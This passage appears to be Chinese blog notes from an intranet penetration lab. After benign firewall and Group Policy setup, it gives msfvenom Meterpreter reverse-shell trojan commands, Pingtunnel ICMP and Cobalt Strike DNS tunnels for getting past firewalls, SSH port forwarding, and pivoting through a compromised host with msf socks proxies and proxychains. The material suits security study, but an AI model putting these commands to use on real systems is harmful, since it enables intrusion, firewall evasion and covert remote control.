&lt;h4 id=&#34;命令行设置防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令行设置防火墙&#34;&gt;#&lt;/a&gt; 命令行设置防火墙&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;netsh advfirewall show currentprofile #查看防火墙状态
netsh advfirewall set allprofiles state on #开启防火墙
netsh advfirewall set allprofiles state off #关闭防火墙
netsh advfirewall firewall add rule name=&amp;quot;80off&amp;quot; dir=in action=block protocol=TCP localport=80 #禁止访问本地TCP协议80端口
netsh advfirewall firewall add rule name=&amp;quot;80on&amp;quot; dir=in action=allow protocol=TCP localport=80 #允许访问本地TCP协议80
netsh advfirewall firewall delete rule name=&amp;quot;80off&amp;quot; #删除名为80off的规则
netsh advfirewall firewall show rule name=&amp;quot;http&amp;quot; #查看名为http的防火墙规则
netsh advfirewall firewall add rule name=&amp;quot;22&amp;quot; dir=in protocol=tcp localport=22 action=block
#阻止所有进入的 TCP 流量通过端口 22。
netsh advfirewall firewall add rule name=&amp;quot;22on&amp;quot; dir=in protocol=tcp localport=22 action=allow
#允许所有进入的 TCP 流量通过端口 22。
https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/rules#官方文档
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;域组策略控制防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域组策略控制防火墙&#34;&gt;#&lt;/a&gt; 域组策略控制防火墙&lt;/h4&gt;
&lt;p&gt;在一个域环境中，域控制器（Domain Controller）可以通过组策略（Group Policy）来管理和同步其下属主机的防火墙规则。这样，管理员就可以集中地管理网络环境中所有计算机的防火墙设置，而不需要在每台计算机上单独进行配置。&lt;/p&gt;
&lt;p&gt;管理员可以在域控制器上创建和配置组策略对象（Group Policy Object，GPO），然后将这些 GPO 应用到一个或多个组织单位（Organizational Unit，OU）上。这些 OU 中的计算机将会自动接收并应用这些 GPO 中的设置，包括防火墙规则。&lt;/p&gt;
&lt;p&gt;在域控组策略新建 GPO&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316152809739.png&#34; alt=&#34;image-20240316152809739&#34;&gt;&lt;/p&gt;
&lt;p&gt;右键编辑打开策略里的防火墙设置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153009887.png&#34; alt=&#34;image-20240316153009887&#34;&gt;&lt;/p&gt;
&lt;p&gt;在另一台域内主机防火墙是关闭的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153127674.png&#34; alt=&#34;image-20240316153127674&#34;&gt;&lt;/p&gt;
&lt;p&gt;在域控这里设置防火墙属性把域防火墙设置为启动&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153220403.png&#34; alt=&#34;image-20240316153220403&#34;&gt;&lt;/p&gt;
&lt;p&gt;右键点击强制会立刻启用该策略，或者使用 gpupdate/force 更新策略，或者主机重启后生效&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153403952.png&#34; alt=&#34;image-20240316153403952&#34;&gt;&lt;/p&gt;
&lt;p&gt;这时域控下属主机防火墙开启并且不可自己关闭必须由管理员设置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155150999.png&#34; alt=&#34;image-20240316155150999&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然设置的防火墙规则也会同步下发到下属主机例如禁止 80 端口入站&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155851138.png&#34; alt=&#34;image-20240316155851138&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;icmp隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#icmp隧道&#34;&gt;#&lt;/a&gt; ICMP 隧道&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173544717.png&#34; alt=&#34;image-20240316173544717&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 TCP 协议封装成 ICMP 协议&lt;/p&gt;
&lt;p&gt;常见工具 Pingtunnel,icmpsh,spp&lt;/p&gt;
&lt;h4 id=&#34;pingtunnel&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pingtunnel&#34;&gt;#&lt;/a&gt; Pingtunnel&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;https://github.com/esrrhs/pingtunnel&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;kali:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4343&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;127.0&lt;/span&gt;.0.1 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; msf.exe &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;0.0&lt;/span&gt;.0.0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;klai使用./pingtunnel &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; server 开启隧道&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;受害机:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pingtunnel.exe &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; client &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; :6666 &lt;span class=&#34;token parameter variable&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.130 &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.130:8888 &lt;span class=&#34;token parameter variable&#34;&gt;-tcp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-noprint&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-nolog&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;运行msf.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;首先生成木马受害机运行后会将流量转发到 127.0.0.1 的 4343 也就是受害机的 4343 端口但是因为木马是 tcp 流量被限制了出不了站这时候用 &lt;code&gt;Pingtunnel&lt;/code&gt;  把 4343 端口的走 &lt;code&gt;tcp&lt;/code&gt;  的流量封装成 &lt;code&gt;icmp&lt;/code&gt;  协议的流量转到 kali 的 9999 端口，然后我们 kali 上面使用 &lt;code&gt;Pingtunnel&lt;/code&gt;  开启隧道，并监听 9999 端口这样我们就可以正常接收到流量绕过防火墙限制了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325172437953.png&#34; alt=&#34;image-20240325172437953&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325164605444.png&#34; alt=&#34;image-20240325164605444&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325170434411.png&#34; alt=&#34;image-20240325170434411&#34;&gt;&lt;/p&gt;
&lt;p&gt;CS 测试&lt;/p&gt;
&lt;p&gt;首先建立两个监听&lt;/p&gt;
&lt;p&gt;p1 为 10.10.10.130 端口 9898&lt;/p&gt;
&lt;p&gt;p2 为 127.0.0.1 端口 6666&lt;/p&gt;
&lt;p&gt;生成木马用 p2 生成，这样受害机器执行木马会将流量转发到本地的 6666 端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151229404.png&#34; alt=&#34;image-20240328151229404&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151611542.png&#34; alt=&#34;image-20240328151611542&#34;&gt;&lt;/p&gt;
&lt;p&gt;受害机:&lt;br&gt;
pingtunnel.exe -type client -l :6666 -s 192.168.0.145 -t 192.168.0.104:8888 -tcp 1 -noprint 1 -nolog 1&lt;/p&gt;
&lt;p&gt;将 6666 端口流量封装成 icmp 转发到 kali 的 9898 端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152102020.png&#34; alt=&#34;image-20240328152102020&#34;&gt;&lt;/p&gt;
&lt;p&gt;kali 启动隧道&lt;/p&gt;
&lt;p&gt;./pingtunnel -type server&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152134631.png&#34; alt=&#34;image-20240328152134631&#34;&gt;&lt;/p&gt;
&lt;p&gt;cs 成功上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151958141.png&#34; alt=&#34;image-20240328151958141&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns隧道搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dns隧道搭建&#34;&gt;#&lt;/a&gt; DNS 隧道搭建&lt;/h3&gt;
&lt;p&gt;准备一个域名&lt;/p&gt;
&lt;p&gt;要添加两条记录分别是 A 记录和 NS 记录&lt;/p&gt;
&lt;p&gt;A 记录指向我们的 vps 服务器&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1OU3MtcXQ5ZGo5bGhhNTI2YXIzM2FqeGFnNnMzc2F2M2VqODFpejY1Yy54eHgueHh4&#34;&gt;NS 记录指向刚才我们创建的 s.xxx.xxx&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1jc2RuczEtY3A3aTkzZDR3djhhMjU5NmFxb2M2NW4yNTRiN21tbm0xYi54eHgueHh4&#34;&gt;然后我们用 cs 上线时指向 dns1.xxx.xxx&lt;/span&gt;，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zLTd6NmFtaXk2aTIzcWN0cW52MGQueHh4Lnh4eA==&#34;&gt;他就会解析到 s.xxx.xxx&lt;/span&gt;，接着 s.xxx.xxx 解析到我们的 vps 地址隧道搭建完成了就&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426164655935.png&#34; alt=&#34;image-20240426164655935&#34;&gt;&lt;/p&gt;
&lt;p&gt;**NS 记录，全称为 Name Server 记录，是用于指定域名应该由哪些 DNS 服务器进行解析的记录。** 它告诉互联网上的其他 DNS 服务器，当有查询请求到达时，应该将请求重定向到哪些 DNS 服务器上。&lt;/p&gt;
&lt;p&gt;接着 cs 创建 DNS 监听&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1kbnMxLTR6OGY0OTBhaGQueHh4LnhuLS14eHhzLTIyMWcueHh4Lnh4eA==&#34;&gt;地址写 dns1.xxx.xxx 和 s.xxx.xxx&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;dns1 解析解析到 s. 接着再解析成 vps 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426165506171.png&#34; alt=&#34;image-20240426165506171&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着生成木马执行后内网主机即可上线&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170240575.png&#34; alt=&#34;image-20240426170240575&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着执行 mode dns-txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170944198.png&#34; alt=&#34;image-20240426170944198&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426171142913.png&#34; alt=&#34;image-20240426171142913&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ssh隧道搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh隧道搭建&#34;&gt;#&lt;/a&gt; SSH 隧道搭建&lt;/h3&gt;
&lt;p&gt;SSH 隧道（SSH Tunneling）是一种利用 SSH 协议为其他协议或网络连接提供安全加密的方法。它通过在 SSH 连接中创建加密通道，可以安全地传输未加密的网络流量，并将其转发到目标目的地，确保数据传输的私密性和安全性。SSH 隧道通常用于加密和保护从本地计算机到远程服务器的通信。&lt;/p&gt;
&lt;p&gt;主要的 SSH 隧道类型包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;本地端口转发（Local Port Forwarding）：将本地计算机的指定端口的流量通过 SSH 连接转发到远程服务器，并由远程服务器将流量转发到目标服务器。这种方式使得本地计算机可以通过 SSH 连接安全地访问目标服务器提供的服务。&lt;/li&gt;
&lt;li&gt;远程端口转发（Remote Port Forwarding）：将远程服务器上的指定端口的流量通过 SSH 连接转发到本地计算机，并由本地计算机将流量转发到目标服务器。这种方式允许远程服务器上的服务通过 SSH 连接安全地访问本地计算机上的服务。&lt;/li&gt;
&lt;li&gt;动态端口转发（Dynamic Port Forwarding）：创建一个本地的 SOCKS 代理服务器，应用程序可以通过配置使用这个 SOCKS 代理，而 SSH 客户端则负责将流量通过 SSH 连接转发出去。这种方式可以用于将本地计算机的所有流量通过 SSH 连接转发到远程服务器，从而实现全局的网络流量加密和安全访问。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;网络环境为&lt;/p&gt;
&lt;p&gt;vps 不可和内网主机访问&lt;/p&gt;
&lt;p&gt;kali 与 web 可通信&lt;/p&gt;
&lt;p&gt;web 内网主机 80 端口&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;远程端口转发 可用于入站被封&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;在kali运行:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-CfNg&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-R&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;:192.168.0.107:80 root@vpsIP&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;这条命令表示将web主机的80端口流量通过本机转发给我们vps的9999端口上&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-C：请求压缩所有数据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-f：后台执行ssh指令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-N：不执行远程指令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-g：允许远程主机连接主机的转发端口&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173707184.png&#34; alt=&#34;image-20240501173707184&#34;&gt;&lt;/p&gt;
&lt;p&gt;vps 即可访问 web 的网站&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173102203.png&#34; alt=&#34;image-20240501173102203&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;本地端口转发 可用于出站被封&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-CfNg&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-L&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8888&lt;/span&gt;:192.168.0.107:80 root@192.168.0.105&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;将web主机的80端口流量转到本机kali的8888端口上&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501181131671.png&#34; alt=&#34;image-20240501181131671&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;代理实验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理实验&#34;&gt;#&lt;/a&gt; 代理实验&lt;/h3&gt;
&lt;p&gt;网络环境为&lt;/p&gt;
&lt;p&gt;win10 192.168.0.146 vm2&lt;br&gt;
server4 192.168.0.145 10.10.10.134 vm2 vm19&lt;br&gt;
web net 10.10.10.137 vm19  192.169.139.120 可出网&lt;br&gt;
 vps 公网&lt;/p&gt;
&lt;p&gt;拿到 web 主机后用他来当作跳板去渗透剩下两台主机，操作在 kali 通过 web 主机进行传输，因为 12server 是不出网的我们无法直接访问但是他是可以跟 web 主机通信的这样就可以在 web 主机上做代理把它当作跳板机和 12server 通信做渗透&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211546933.png&#34; alt=&#34;image-20240401211546933&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;msf代理测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf代理测试&#34;&gt;#&lt;/a&gt; msf 代理测试&lt;/h4&gt;
&lt;p&gt;首先生成木马获取 web 主机&lt;/p&gt;
&lt;p&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.139.194 -f exe -o 555.exe&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240331172619806.png&#34; alt=&#34;image-20240331172619806&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着 msf 添加路由&lt;/p&gt;
&lt;p&gt;run post/multi/manage/autoroute&lt;/p&gt;
&lt;p&gt;run autoroute -p&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211151335.png&#34; alt=&#34;image-20240401211151335&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着用到 &lt;code&gt;use auxiliary/server/socks_proxy&lt;/code&gt;  socks 代理模块开启 socks 代理&lt;/p&gt;
&lt;p&gt;设置好配置运行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191609467.png&#34; alt=&#34;image-20240401191609467&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时我们用本地的主机访问 12server10 网段的的网站是访问不到的，下载 sockscap64 软件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191937614.png&#34; alt=&#34;image-20240401191937614&#34;&gt;&lt;/p&gt;
&lt;p&gt;配置好代理，地址是公网 kali 的 ip 和刚才 socks 代理模块开启的端口&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192153184.png&#34; alt=&#34;image-20240401192153184&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置好可以通信后可以把代理添加到程序中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193150388.png&#34; alt=&#34;image-20240401193150388&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192344752.png&#34; alt=&#34;image-20240401192344752&#34;&gt;&lt;/p&gt;
&lt;p&gt;用代理打开浏览器后就可用访问内网 10.10.10.0 网段了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193308682.png&#34; alt=&#34;image-20240401193308682&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 kali 中只是 msf 可以跟 10 通信，要做到使用其他工具对 10 网段进行渗透可用用到 proxychains 代理&lt;/p&gt;
&lt;p&gt;对 proxychains.conf 更改写入刚才 msf 代理模块设置的端口 ip，或者 proxychains4.conf&lt;/p&gt;
&lt;p&gt;vim /etc/proxychains.conf&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210033816.png&#34; alt=&#34;image-20240401210033816&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置好代理以后在要使用的工具前面加上 proxychains 命令例如 nmap 对 10.10.10.134 进行扫描，这样我们就可以在 kali 对 10 网段的内网渗透起来就会方便很多&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210313313.png&#34; alt=&#34;image-20240401210313313&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;cs代理测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs代理测试&#34;&gt;#&lt;/a&gt; cs 代理测试&lt;/h4&gt;
&lt;p&gt;Proxifier 代理工具&lt;/p&gt;
&lt;p&gt;cs 生成木马获取 web 主机权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132210710.png&#34; alt=&#34;image-20240402132210710&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后设置 socks 代理&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132259507.png&#34; alt=&#34;image-20240402132259507&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开 Proxifier 代理工具配置文件代理服务器公网 kali 地址和刚才设置的端口 47385&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132417647.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132650862.png&#34; alt=&#34;image-20240402132650862&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启代理之前无法访问 12server 内网中的网站&lt;/p&gt;
